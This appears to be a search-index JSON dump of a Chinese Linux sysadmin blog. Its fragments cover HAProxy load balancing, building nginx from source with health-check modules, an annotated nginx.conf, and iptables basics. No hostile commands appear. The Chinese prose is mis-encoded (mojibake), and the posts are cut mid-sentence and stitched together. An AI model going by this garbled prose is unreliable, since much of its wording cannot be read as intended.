è´Ÿè½½å‡è¡¡æ¨¡å¼roundrobin(è½®è¯¢);source(ip hash);static-rr(æƒé‡è½®è¯¢);leastconn(ä»¥æœåŠ¡å™¨è¿æ¥æ•°è½®è¯¢ï¼Œè¿æ¥æ•°æœ€ä½çš„ä¼˜å…ˆè¿æ¥) balance roundrobin # check: å¯ç”¨å¥åº·æ£€æŸ¥ # inter é»˜è®¤2ç§’æ£€æŸ¥ # rise æ£€æŸ¥è¿ç»­å¯ä»¥çš„æ¬¡æ•°ï¼Œå½“è¶…è¿‡è¯¥æ¬¡æ•°,åŠ å…¥è¯¥èŠ‚ç‚¹ï¼Œå¯ç”¨æ¬¡æ•°ä¸€èˆ¬è®¾ç½®ç¨å¤§ # 1fall æ£€æŸ¥è¿ç»­ä¸å¯ç”¨çš„æ¬¡æ•°ï¼Œå½“è¶…è¿‡è¯¥æ¬¡æ•°,å‰”é™¤è¯¥èŠ‚ç‚¹ server node1 172.10.10.11:8081 check inter 2000 rise 30 fall 15 server node2 172.10.10.12:8081 check inter ","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:0:0","tags":["linux","haproxy","åå‘ä»£ç†"],"title":"Haproxyéƒ¨ç½²ä¸å¸¸ç”¨æ“ä½œ","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Nginxå®‰è£…ç»´æŠ¤","date":"2019-04-10","objectID":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/","tags":["linux","nginx"],"title":"Nginxå®‰è£…ç»´æŠ¤","uri":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"æ­å»ºç¯å¢ƒï¼š nginxï¼š1.14.2 æœåŠ¡å™¨ï¼šcentos7 ä¾èµ–å®‰è£… [root@00 software]# yum install -y gcc glibc gcc-c++ pcre-devel openssl-devel git #å®‰è£…ä¾èµ–å…³ç³» [root@00 software]# mkdir /opt/software [root@00 software]# cd /opt/software [root@00 software]# wget http://nginx.org/download/nginx-1.14.2.tar.gz # nginx è´Ÿè½½å‡è¡¡æ£€æµ‹æ¨¡å— # [root@00 software]# git clone https://github.com/yaoweibin/nginx_upstream_check_module.git # vts-status æ¨¡å—ç”¨äºæ›¿æ¢é»˜è®¤çš„ http_stub_status_module å¯ç”¨vtsæ—¶å¯ä»¥ä¸å¯ç”¨é»˜è®¤çš„ # [root@00 nginx-1.14.2]# git clone https://github.com/vozlt/nginx-module-vts.git # ç¼–è¯‘å®‰è£…ï¼ˆå®‰è£…è¿‡ç¨‹è‹¥å·®åŒ…ç›´æ¥è£…ä¸Šå°±å¯ä»¥äº†ï¼‰ [root@00 software]# tar xzvf nginx-1.14.2.tar.gz [root@00 software]# cd nginx-1.14.2 [root@00 nginx-1.14.2]# useradd -d /var/ftproot -s /sbin/nologin www -u 1002 # è´Ÿè½½å‡è¡¡æ¨¡å—æ·»åŠ ,æ·»åŠ å¯¹åº”ç‰ˆæœ¬çš„è¡¥ä¸ # [root@00 nginx-1.14.2]# patch -p1 \u003c ../nginx_upstream_check_module/check_1.14.0+.patch # # éšè—é»˜è®¤ç‰ˆæœ¬å·ï¼Œéšè—é»˜è®¤æ ‡è¯† # sed -i 's#\"1.14.2\"#\"\"#g' ./src/core/nginx.h # sed -i 's#\"NGINX\"#\"0x5c0f\"#g' ./src/core/nginx.h # sed -i 's#\"nginx/\"#\"0x5c0f/\"#g' ./src/core/nginx.h # sed -i 's#\"Server: nginx\"#\"Server: 0x5c0f\"#g' ./src/http/ngx_http_header_filter_module.c # sed -i 's#\u003ccenter\u003enginx\u003c/center\u003e#\u003ccenter\u003e0x5c0f\u003c/center\u003e#g' ./src/http/ngx_http_special_response.c # grep \"0x5c0f\" ./src/http/ngx_http_header_filter_module.c ./src/http/ngx_http_special_response.c ./src/core/nginx.h [root@00 nginx-1.14.2]# ./configure --user=www --group=www --with-http_ssl_module --with-http_stub_status_module --prefix=/opt/nginx-1.14.2 #--with-http_realip_module ï¼ˆå»ºè®®æ·»åŠ ç”¨äºæ—¥å¿—åˆ†æï¼‰ # --add-module=../nginx_upstream_check_module/ (è´Ÿè½½å‡è¡¡æ¨¡å—ç¼–è¯‘ï¼Œæ–°å¢æ—¶æ³¨æ„ä¿ç•™åŸæœ‰å‚æ•°) # --add-module=../nginx-module-vts/ (è´Ÿè½½å‡è¡¡æ¨¡å—ç¼–è¯‘ï¼Œæ–°å¢æ—¶æ³¨æ„ä¿ç•™åŸæœ‰å‚æ•°) # checking for OS + Linux 2.6.32-71.el6.i686 i686 checking for C compiler ... found + using GNU C compiler + gcc version: 4.4.4 20100726 (Red Hat 4.4.4-13) (GCC) checking for gcc -pipe switch ... found checking for -Wl,-E switch ... found checking for gcc builtin atomic operations ... found checking for C99 variadic macros ... found checking for gcc variadic macros ... found -----å¿½ç•¥éƒ¨åˆ†å†…å®¹----- nginx path prefix: \"/opt/nginx-1.14.2\" nginx binary file: \"/opt/nginx-1.14.2/sbin/nginx\" nginx modules path: \"/opt/nginx-1.14.2/modules\" nginx configuration prefix: \"/opt/nginx-1.14.2/conf\" nginx configuration file: \"/opt/nginx-1.14.2/conf/nginx.conf\" nginx pid file: \"/opt/nginx-1.14.2/logs/nginx.pid\" nginx error log file: \"/opt/nginx-1.14.2/logs/error.log\" nginx http access log file: \"/opt/nginx-1.14.2/logs/access.log\" nginx http client request body temporary files: \"client_body_temp\" nginx http proxy temporary files: \"proxy_temp\" nginx http fastcgi temporary files: \"fastcgi_temp\" nginx http uwsgi temporary files: \"uwsgi_temp\" nginx http scgi temporary files: \"scgi_temp\" [root@00 software]# make make -f objs/Makefile make[1]: Entering directory `/opt/software/nginx-1.14.2' cc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs \\ -o objs/src/core/nginx.o \\ src/core/nginx.c -----å¿½ç•¥éƒ¨åˆ†å†…å®¹----- sed -e \"s|%%PREFIX%%|/opt/nginx-1.14.2|\" \\ -e \"s|%%PID_PATH%%|/opt/nginx-1.14.2/logs/nginx.pid|\" \\ -e \"s|%%CONF_PATH%%|/opt/nginx-1.14.2/conf/nginx.conf|\" \\ -e \"s|%%ERROR_LOG_PATH%%|/opt/nginx-1.14.2/logs/error.log|\" \\ \u003c man/nginx.8 \u003e objs/nginx.8 make[1]: Leaving directory `/opt/software/nginx-1.14.2' [root@00 nginx-1.14.2]# make install make -f objs/Makefile install make[1]: Entering directory `/opt/software/nginx-1.14.2' test -d '/opt/nginx-1.14.2' || mkdir -p '/opt/nginx-1.14.2' test -d '/opt/nginx-1.14.2/sbin' \\ || mkdir -p '/opt/nginx-1.14.2/sbin' ----å¿½ç•¥éƒ¨åˆ†å†…å®¹----- make[1]: Leaving directory `/opt/software/nginx-1.14.2' [root@00 nginx-1.14.2]# ln -s /opt/nginx-1.14.2/ /opt/nginxssl #åˆ›å»ºè½¯è¿æ¥,ç”¨äºç‰ˆæœ¬æ§åˆ¶,æ­¤æ­¥éª¤å¯ä»¥ä¸åš # è´Ÿè½½å‡è¡¡æ¨¡å—æ˜¾ç¤ºé…ç½® # 1. éœ€è¦åœ¨ upstream æ¨¡å—ä¸­æ·»åŠ æ£€æµ‹ # check interval=3000 rise=2 fall=5 timeout=1000 type=http;(æ¯éš”3ç§’æ£€æµ‹ä¸€æ¬¡,è¯·æ±‚2æ¬¡æ­£å¸¸åˆ™æ ‡è®°realserverçŠ¶æ€ä¸ºup,å¦‚æœæ£€æµ‹5æ¬¡éƒ½å¤±è´¥,åˆ™æ ‡è®°realserverçš„çŠ¶æ€ä¸ºdown,è¶…è¿‡æ—¶é—´ä¸º1ç§’ï¼Œæ£€æŸ¥åè®®ä¸ºhttp) # 2. serverä¸­æ·»åŠ location (å¯åˆå¹¶) # location /status { # check_status; # access_log off; # } å¯åŠ¨ [root@00 Des","date":"2019-04-10","objectID":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/:0:0","tags":["linux","nginx"],"title":"Nginxå®‰è£…ç»´æŠ¤","uri":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":"Nginxä¸»é…ç½®æ–‡ä»¶nginx.confè¶…è¯¦ç»†ä¸­æ–‡è¯¦è§£","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/","tags":["linux","nginx"],"title":"Nginxä¸»é…ç½®æ–‡ä»¶nginx.confè¶…è¯¦ç»†ä¸­æ–‡è¯¦è§£","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":" æ³¨æ„ æœ¬æ–‡åŸæ–‡å‡ºè‡ªè€ç”·å­©å¾®ä¿¡å…¬ä¼—å·:oldboyedu, åŸæ–‡è¿æ¥å·²ç»ä¸¢å¤±ï¼Œç°æ”¶é›†äºç½‘ç»œè½¬è½½æ–‡æœ¬ï¼Œç”¨äºä¸ªäººæ•´ç†è®°å½• 1. ä½œè€…ç®€ä»‹ è€ç”·å­©ï¼ŒåŒ—äº¬è€ç”·å­©ITæ•™è‚²åˆ›å§‹äººï¼Œç•…é”€å›¾ä¹¦ä½œè€…ï¼Œ51CTOé‡‘ç‰Œè®²å¸ˆï¼Œ16å¹´è¿ç»´ç»éªŒåŠåŸ¹è®­ç»éªŒï¼Œ ITç•Œé¡¶çº§Linuxé›†ç¾¤æ¶æ„å®æˆ˜ä¸æ•™è‚²ä¸“å®¶ã€‚ å›½å†…ITæ•™è‚²å®æˆ˜å¿ƒç†å­¦è¿ç»´æ€æƒ³ä½“ç³»åˆ›å§‹äººï¼Œå°†å¿ƒç†å­¦è¿ç»´æ€æƒ³å¤§é‡åº”ç”¨äºæ•™å­¦åŸ¹è®­å®è·µï¼Œæˆå°±å±Œä¸æ— æ•°ã€‚æ‰€æ•™å­¦ç”Ÿå¹³å‡å°±ä¸šå·¥èµ„åŠåæœŸå‘å±•é€Ÿåº¦è¿ç»­å¤šå¹´åœ¨å›½å†…åŒè¡Œä¸šæ’åç¬¬ä¸€ï¼ è€ç”·å­©è€å¸ˆä¸ªäººåšå®¢ï¼š http://oldboy.blog.51cto.com http://blog.oldboyedu.com 2. Nginxæ ¸å¿ƒé…ç½®æ–‡ä»¶nginx.confå²ä¸Šæœ€ç»†ä¸­æ–‡è¯¦è§£ 2.1. å®šä¹‰Nginxè¿è¡Œçš„ç”¨æˆ·å’Œç”¨æˆ·ç»„ user nginx nginx; #æ”¹ä¸ºç‰¹æ®Šçš„ç”¨æˆ·å’Œç»„ nginxworker è¿›ç¨‹æ•°ï¼Œå³å¤„ç†è¯·æ±‚çš„è¿›ç¨‹ï¼ˆç†Ÿç§°è´Ÿè´£æ¥å®¢çš„æœåŠ¡å‘˜ï¼‰ worker_processes 8; #åˆå§‹å¯è®¾ç½®ä¸ºCPUæ€»æ ¸æ•° 2.2. cpuäº²å’ŒåŠ›é…ç½®ï¼Œè®©ä¸åŒçš„è¿›ç¨‹ä½¿ç”¨ä¸åŒçš„cpu worker_cpu_affinity 0001 0010 0100 1000 0001 00100100 1000; 2.3. å…¨å±€é”™è¯¯æ—¥å¿—å®šä¹‰ç±»å‹ï¼Œ[ debug|info|notice|warn|error|crit] error_log logs/error.log error; #ä¸€å®šè¦è®¾ç½®warnçº§åˆ«ä»¥ä¸Š 2.4. æŠŠè¿›ç¨‹å·è®°å½•åˆ°æ–‡ä»¶ pid logs/nginx.pid; #ç”¨äºç®¡ç†nginxè¿›ç¨‹ 2.5. Nginxworkeræœ€å¤§æ‰“å¼€æ–‡ä»¶æ•°ï¼Œå¯è®¾ç½®ä¸ºç³»ç»Ÿä¼˜åŒ–åçš„ulimit -HSnçš„ç»“æœ worker_rlimit_nofile 65535; 2.6. IOäº‹ä»¶æ¨¡å‹ä¸workerè¿›ç¨‹è¿æ¥æ•°è®¾ç½® events { #epollæ¨¡å‹æ˜¯Linux 2.6ä»¥ä¸Šç‰ˆæœ¬å†…æ ¸ä¸­çš„é«˜æ€§èƒ½ç½‘ç»œI/Oæ¨¡å‹ use epoll; #å•ä¸ªworkerè¿›ç¨‹æœ€å¤§è¿æ¥æ•° worker_connections 10240; #nginxæœ€å¤§è¿æ¥æ•°=workerè¿æ¥æ•°*workerè¿›ç¨‹æ•° } 2.7. httpæ¨¡å—è®¾ç½®éƒ¨åˆ† http{ server_tokens off; #éšè—å“åº”headerå’Œé”™è¯¯é€šçŸ¥ä¸­çš„ç‰ˆæœ¬å· include mime.types; #æ–‡ä»¶æ‰©å±•åä¸æ–‡ä»¶ç±»å‹æ˜ å°„è¡¨ default_type application/octet-stream;#é»˜è®¤æ–‡ä»¶ç±»å‹ server_names_hash_max_size 512; #æœåŠ¡åŸŸåçš„æœ€å¤§hashè¡¨å¤§å° server_names_hash_bucket_size 128;#æœåŠ¡åŸŸåçš„hashè¡¨å¤§å° #å¼€å¯é«˜æ•ˆæ–‡ä»¶ä¼ è¾“æ¨¡å¼ï¼Œå®ç°å†…æ ¸é›¶æ‹·è´ sendfile on; #æ¿€æ´»tcp_nopushå‚æ•°å¯ä»¥å…è®¸æŠŠhttpresponse headerå’Œæ–‡ä»¶çš„å¼€å§‹æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œå‘å¸ƒï¼Œç§¯æçš„ä½œç”¨æ˜¯å‡å°‘ç½‘ç»œæŠ¥æ–‡æ®µçš„æ•°é‡ tcp_nopush on; #æ¿€æ´»tcp_nodelayï¼Œå†…æ ¸ä¼šç­‰å¾…å°†æ›´å¤šçš„å­—èŠ‚ç»„æˆä¸€ä¸ªæ•°æ®åŒ…ï¼Œä»è€Œæé«˜I/Oæ€§èƒ½ tcp_nodelay on; #è¿æ¥è¶…æ—¶æ—¶é—´ï¼Œå•ä½æ˜¯ç§’ keepalive_timeout 120; #ç›®å½•åˆ—è¡¨è®¿é—®å‚æ•°ï¼Œåˆé€‚httpä¸‹è½½ï¼Œé»˜è®¤å…³é—­ã€‚ autoindex off; #è¯»å–å®¢æˆ·ç«¯è¯·æ±‚å¤´çš„è¶…æ—¶æ—¶é—´ï¼ˆå‚çœ‹è€ç”·å­©çš„ä¹¦ç±ç†è§£httpåè®®åŸç†ï¼‰ client_header_timeout 15s; #è¯»å–å®¢æˆ·ç«¯è¯·æ±‚ä¸»ä½“çš„è¶…æ—¶æ—¶é—´ï¼ˆå‚çœ‹è€ç”·å­©çš„ä¹¦ç±ç†è§£httpåè®®åŸç†ï¼‰ client_body_timeout 60s; #è®¾å®šè¯»å–å®¢æˆ·ç«¯è¯·æ±‚ä¸»ä½“çš„æœ€å¤§å¤§å°ã€‚ï¼ˆå‚çœ‹è€ç”·å­©çš„ä¹¦ç±ç†è§£httpåè®®åŸç†ï¼‰ client_max_body_size 8m; #è®¾ç½®æœåŠ¡å™¨ç«¯ä¼ é€httpå“åº”ä¿¡æ¯åˆ°å®¢æˆ·ç«¯çš„è¶…æ—¶æ—¶é—´ send_timeout 60s; #è®¾å®šè®¿é—®æ—¥å¿—çš„æ—¥å¿—è®°å½•æ ¼å¼ï¼Œæ¯åˆ—ç»†èŠ‚å‚è€ƒã€Šè·Ÿè€ç”·å­©å­¦linuxè¿ç»´ã€‹:Webé›†ç¾¤å®æˆ˜ log_format main '$remote_addr - $remote_user$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\"$http_x_forwarded_for\"'; #FastCGIå‚æ•°æ˜¯å’ŒåŠ¨æ€æœåŠ¡å™¨äº¤äº’èµ·ä½œç”¨çš„å‚æ•° #è®¾å®šNginxæœåŠ¡å™¨å’Œåç«¯FastCGIæœåŠ¡å™¨è¿æ¥çš„è¶…æ—¶æ—¶é—´ fastcgi_connect_timeout 60; #è®¾å®šNginxå…è®¸FastCGIæœåŠ¡ç«¯è¿”å›æ•°æ®çš„è¶…æ—¶æ—¶é—´ fastcgi_send_timeout 60; #è®¾å®šNginxä»FastCGIæœåŠ¡ç«¯è¯»å–å“åº”ä¿¡æ¯çš„è¶…æ—¶æ—¶é—´ fastcgi_read_timeout 60; #è®¾å®šç”¨æ¥è¯»å–ä»FastCGIæœåŠ¡ç«¯æ”¶åˆ°çš„ç¬¬ä¸€éƒ¨åˆ†å“åº”ä¿¡æ¯çš„ç¼“å†²åŒºå¤§å° fastcgi_buffer_size 64k; #è®¾å®šç”¨æ¥è¯»å–ä»FastCGIæœåŠ¡ç«¯æ”¶åˆ°çš„å“åº”ä¿¡æ¯çš„ç¼“å†²åŒºå¤§å°ä»¥åŠç¼“å†²åŒºæ•°é‡ fastcgi_buffers 4 64k; #è®¾å®šç³»ç»Ÿå¾ˆå¿™æ—¶å¯ä»¥ä½¿ç”¨çš„fastcgi_bufferså¤§å°ï¼Œæ¨èå¤§å°ä¸ºfastcgi_buffers *2ã€‚ fastcgi_busy_buffers_size 128k; #fastctiä¸´æ—¶æ–‡ä»¶çš„å¤§å°ï¼Œå¯è®¾ç½®128-256K fastcgi_temp_file_write_size 128k; #gzipå‹ç¼©æ¨¡å—éƒ¨åˆ†ï¼ˆæ­¤éƒ¨åˆ†å¯¹äºç½‘ç«™ä¼˜åŒ–æå…¶é‡è¦ï¼‰ #å¼€å¯gzipå‹ç¼©åŠŸèƒ½ã€‚ gzip on; #è®¾ç½®å…è®¸å‹ç¼©çš„é¡µé¢æœ€å°å­—èŠ‚æ•°ï¼Œé¡µé¢å­—èŠ‚æ•°ä»headerå¤´çš„Content-Lengthä¸­è·å–ã€‚é»˜è®¤å€¼æ˜¯0ï¼Œè¡¨ç¤ºä¸ç®¡é¡µé¢å¤šå¤§éƒ½è¿›è¡Œå‹ç¼©ã€‚å»ºè®®è®¾ç½®æˆå¤§äº1Kã€‚å¦‚æœå°äº1Kå¯èƒ½ä¼šè¶Šå‹è¶Šå¤§ã€‚ gzip_min_length 1k; #å‹ç¼©ç¼“å†²åŒºå¤§å°ã€‚è¡¨ç¤ºç”³è¯·4ä¸ªå•ä½ä¸º16Kçš„å†…å­˜ä½œä¸ºå‹ç¼©ç»“æœæµç¼“å­˜ï¼Œé»˜è®¤å€¼æ˜¯ç”³è¯·ä¸åŸå§‹æ•°æ®å¤§å°ç›¸åŒçš„å†…å­˜ç©ºé—´æ¥å­˜å‚¨gzipå‹ç¼©ç»“æœã€‚ gzip_buffers 4 16k; #å‹ç¼©ç‰ˆæœ¬ï¼ˆé»˜è®¤1.1ï¼Œå‰ç«¯ä¸ºsquid2.5æ—¶ä½¿ç”¨1.0ï¼‰ç”¨äºè®¾ç½®è¯†åˆ«HTTPåè®®ç‰ˆæœ¬ï¼Œé»˜è®¤æ˜¯1.1ï¼Œç›®å‰å¤§éƒ¨åˆ†æµè§ˆå™¨å·²ç»æ”¯æŒGZIPè§£å‹ï¼Œä½¿ç”¨é»˜è®¤å³å¯ã€‚ gzip_http_version 1.1; #å‹ç¼©æ¯”ç‡ã€‚ç”¨æ¥æŒ‡å®šGZIPå‹ç¼©æ¯”ï¼Œ1å‹ç¼©æ¯”æœ€å°ï¼Œå¤„ç†é€Ÿåº¦æœ€å¿«ï¼›9å‹ç¼©æ¯”æœ€å¤§ï¼Œä¼ è¾“é€Ÿåº¦å¿«ï¼Œä½†å¤„ç†æœ€æ…¢ï¼Œä¹Ÿæ¯”è¾ƒæ¶ˆè€—cpuèµ„æºã€‚ gzip_comp_level 2; #ç”¨æ¥æŒ‡å®šå‹ç¼©çš„ç±»å‹ï¼Œâ€œtext/htmlâ€ç±»å‹æ€»æ˜¯ä¼šè¢«å‹ç¼©ï¼Œè¿™ä¸ªå°±æ˜¯HTTPåŸç†éƒ¨åˆ†è®²çš„åª’ä½“ç±»å‹ã€‚ gzip_typestext/plain application/x-javascript text/css application/xml; #vary headeræ”¯æŒã€‚è¯¥é€‰é¡¹å¯ä»¥è®©å‰ç«¯çš„ç¼“å­˜æœåŠ¡å™¨ç¼“å­˜ç»è¿‡GZIPå‹ç¼©çš„é¡µé¢ï¼Œä¾‹å¦‚ç”¨Squidç¼“å­˜ç»è¿‡Nginxå‹ç¼©çš„æ•°æ®ã€‚ gzip_vary on; #åå‘ä»£ç†è´Ÿè½½å‡è¡¡è®¾å®šéƒ¨åˆ†ï¼ˆå¯é€‰ï¼‰ #upstreamè¡¨ç¤ºè´Ÿè½½æœåŠ¡å™¨æ± ï¼Œå®šä¹‰åå­—ä¸ºblog.oldboyedu.comçš„æœåŠ¡å™¨æ±  upstream blog.oldboyedu.com { #serveræ˜¯æœåŠ¡å™¨èŠ‚ç‚¹èµ·å§‹æ ‡ç­¾ï¼Œå…¶åæ˜¯èŠ‚ç‚¹åœ°å€ï¼Œå¯ä¸ºåŸŸåæˆ–IPï¼Œweightæ˜¯æƒé‡ï¼Œå¯ä»¥æ ¹æ®æœºå™¨é…ç½®å®šä¹‰æƒé‡ã€‚weigthå‚æ•°è¡¨ç¤ºæƒå€¼ï¼Œæƒå€¼è¶Šé«˜è¢«åˆ†é…åˆ°çš„å‡ ç‡è¶Šå¤§ã€‚ ip_hash; #è°ƒåº¦ç®—æ³•ï¼Œé»˜è®¤æ˜¯rrè½®è¯¢ã€‚ server 172.16.1.7:80 weight=1; server 172.16.1.8:80 weight=1; server 172.16.1.9:80 weight=1 backup; #backupè¡¨ç¤ºçƒ­å¤‡ } ## è®¾å®šåŸºäºåŸŸåçš„è™šæ‹Ÿä¸»æœºéƒ¨åˆ† ###oldboy www web php server server { listen 80; #ç›‘å¬çš„ç«¯å£ï¼Œä¹Ÿå¯ä»¥æ˜¯172.16.1.7:80å½¢å¼ server_name www.oldboyedu.comoldboyedu.com; #åŸŸå root html/blog; #ç«™ç‚¹æ ¹ç›®å½•ï¼Œå³ç½‘ç«™ç¨‹åºæ”¾çš„ç›®å½• location / { #é»˜è®¤è®¿é—®çš„locationæ ‡ç­¾æ®µ index index.php index.htmlindex.htm; #é¦–é¡µæ’åº } location ~.*.(php|php5)?$ { #ç¬¦åˆphpæ‰©å±•åçš„è¯·æ±‚è°ƒåº¦åˆ°fcgi server fastcgi_pass 127.0.0.1:9000; #æŠ›ç»™æœ¬æœºçš„9000ç«¯å£(php fastcgi server) fastcgi_index index.php; #è®¾å®šåŠ¨æ€é¦–é¡µ include fastcgi.conf; #è®¾å®šå’Œfastcgiäº¤äº’çš„ç›¸å…³å‚æ•°åŒ…å«æ–‡ä»¶ } ### å°†ç¬¦åˆé™æ€æ–‡ä»¶çš„å›¾ç‰‡è§†é¢‘æµåª’ä½“ç­‰è®¾å®šexpriesç¼“å­˜å‚æ•°ï¼Œè¦æ±‚æµè§ˆå™¨ç¼“å­˜ã€‚ location~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$ { expires 10y; #å®¢æˆ·ç«¯ç¼“å­˜ä¸Šè¿°é™æ€æ•°æ®10å¹´ } ### å°†ç¬¦åˆjs,cssæ–‡ä»¶çš„ç­‰è®¾å®šexpriesç¼“å­˜å‚æ•°ï¼Œè¦æ±‚æµè§ˆå™¨ç¼“å­˜ã€‚ location~ .*\\.(js|css)?$ { expires 30d; #å®¢æˆ·ç«¯ç¼“å­˜ä¸Šè¿°js,cssæ•°æ®30å¤© } access_log /app/logs/www_access.log main; #æ ¹æ®æ—¥å¿—æ ¼å¼è®°å½•ç”¨æˆ·è®¿é—®çš„æ—¥å¿— } 2.","date":"2019-03-14","objectID":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/:0:0","tags":["linux","nginx"],"title":"Nginxä¸»é…ç½®æ–‡ä»¶nginx.confè¶…è¯¦ç»†ä¸­æ–‡è¯¦è§£","uri":"/posts/linux/nginx.conf%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Iptableså¸¸ç”¨","date":"2019-03-08","objectID":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/","tags":["linux","iptables"],"title":"Iptableså¸¸ç”¨","uri":"/posts/linux/iptables%E5%B8%B8%E7%94%A8/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. iptables å·¥ä½œæµç¨‹ é˜²ç«å¢™æ˜¯ä¸€å±‚ä¸€å±‚è¿‡æ»¤çš„ï¼Œå®é™…æ˜¯æŒ‰ç…§é…ç½®è§„åˆ™çš„é¡ºåºä»ä¸Šåˆ°ä¸‹ï¼Œä»å‰åˆ°åè¿›è¡Œè¿‡æ»¤çš„ã€‚ å¦‚æœåŒ¹é…ä¸Šè§„åˆ™ï¼Œå³æ˜ç¡®è¡¨æ˜æ˜¯é˜»æ­¢è¿˜æ˜¯é€šè¿‡ï¼Œæ­¤æ—¶æ•°æ®åŒ…å°±ä¸åœ¨å‘ä¸‹è¿›è¡Œæ–°çš„åŒ¹é…è§„åˆ™äº†ã€‚ å¦‚æœæ‰€æœ‰è§„åˆ™ä¸­æ²¡æœ‰æ˜ç¡®è¡¨æ˜æ˜¯é˜»æ­¢è¿˜æ˜¯é€šè¿‡è¿™ä¸ªæ•°æ®åŒ…ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰åŒ¹é…ä¸Šçš„è§„åˆ™ï¼Œå‘ä¸‹è¿›è¡ŒåŒ¹é…ï¼Œç›´åˆ°åŒ¹é…é»˜è®¤è§„åˆ™å¾—åˆ°æ˜ç¡®çš„é˜»æ­¢è¿˜æ˜¯é€šè¿‡. é˜²ç«å¢™çš„é»˜è®¤è§„åˆ™æ˜¯å¯¹åº”é“¾çš„æ‰€æœ‰çš„è§„åˆ™æ‰§è¡Œå®Œæˆåæ‰ä¼šæ‰§è¡Œã€‚ 2. iptables è¡¨å’Œé“¾ 4 è¡¨: filter åŒ…è¿‡æ»¤ï¼Œç”¨äºé˜²ç«å¢™è§„åˆ™ã€‚ net åœ°å€è½¬æ¢ï¼Œç”¨äºç½‘å…³è·¯ç”±å™¨ã€‚ mangle æ•°æ®åŒ…ä¿®æ”¹ï¼ˆQOSï¼‰ï¼Œç”¨äºå®ç°æœåŠ¡è´¨é‡ã€‚ raw é«˜çº§åŠŸèƒ½ï¼Œå¦‚ï¼šç½‘å€è¿‡æ»¤ã€‚ 5é“¾: INPUTé“¾ å¤„ç†è¾“å…¥æ•°æ®åŒ…ã€‚ OUTPUTé“¾ å¤„ç†è¾“å‡ºæ•°æ®åŒ…ã€‚ PORWARDé“¾ å¤„ç†è½¬å‘æ•°æ®åŒ…ã€‚ PREROUTINGé“¾ ç”¨äºç›®æ ‡åœ°å€è½¬æ¢ï¼ˆDNATï¼‰ã€‚ POSTOUTINGé“¾ ç”¨äºæºåœ°å€è½¬æ¢ï¼ˆSNATï¼‰ã€‚ 3. iptables å‘½ä»¤ å‚æ•° ä½œç”¨ -F æ¸…ç©ºæ‰€æœ‰è§„åˆ™ï¼Œä¸ä¼šå¤„ç†é»˜è®¤è§„åˆ™ -X åˆ é™¤ç”¨æˆ·è‡ªå®šä¹‰çš„é“¾ -Z æ¸…ç©ºé“¾çš„è®¡æ•°å™¨ -t æŒ‡å®šè¡¨(é»˜è®¤filter) -A æ·»åŠ è§„åˆ™åˆ°æŒ‡å®šé“¾çš„ç»“å°¾(æŸ¥æ‰¾å¯¹åº”é“¾ï¼Œåšä»€ä¹ˆå¤„ç†) -I æ·»åŠ è§„åˆ™åˆ°æŒ‡å®šé“¾çš„å¼€å¤´(æŸ¥æ‰¾å¯¹åº”é“¾ï¼Œåšä»€ä¹ˆå¤„ç†) -P æŒ‡å®šåè®®: all(é»˜è®¤)ã€tcpã€udpã€icmp --dport æŒ‡å®šç›®çš„ç«¯å£(ç«¯å£èŒƒå›´å†’å·åˆ†å‰²,å¦‚:80:89) --sport æŒ‡å®šæºç«¯å£(ç«¯å£èŒƒå›´å†’å·åˆ†å‰²,å¦‚:80:89) -m multiport --dport/--sport æŒ‡å®šåŒ¹é…å¤šä¸ªç«¯å£,éœ€é…åˆ(--dport -j è¡Œä¸º ACCEPT(æ¥å—)ã€DROP(ä¸¢å¼ƒ)ã€REJECT(æ‹’ç»:REJECTä¼šåé¦ˆç»™æ‹’ç»å¯¹è±¡ä¿¡æ¯) -s æŒ‡å®šæºipåœ°å€ -i æŒ‡å®šè¿›å…¥çš„ç½‘å¡ -o æŒ‡å®šå‡ºå»çš„ç½‘å¡ -n ä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºipå’Œç«¯å£(é»˜è®¤ä¸»æœºåã€ç½‘ç»œå),éœ€é…åˆ-Lä½¿ç”¨ -L åˆ—å‡ºæ‰€æœ‰è§„åˆ™ -D åˆ é™¤å•æ¡è§„åˆ™ --line-number æ˜¾ç¤ºåºå· -m state --state new: å·²ç»æˆ–å°†å¯åŠ¨æ–°çš„è¿æ¥ã€ESTABLISHED:å·²å»ºç«‹çš„è¿æ¥ã€ RELATED: æ­£åœ¨å¯åŠ¨çš„æ–°è¿æ¥ã€INVALID: éæ³•æˆ–æ— æ³•è¯†åˆ«çš„ -m limit --limit n/{second/minute/hour} é™åˆ¶æŒ‡å®šæ—¶é—´åŒ…çš„å…è®¸é€šè¿‡æ•°é‡åŠå¹¶å‘æ•° --limit-burst [n] 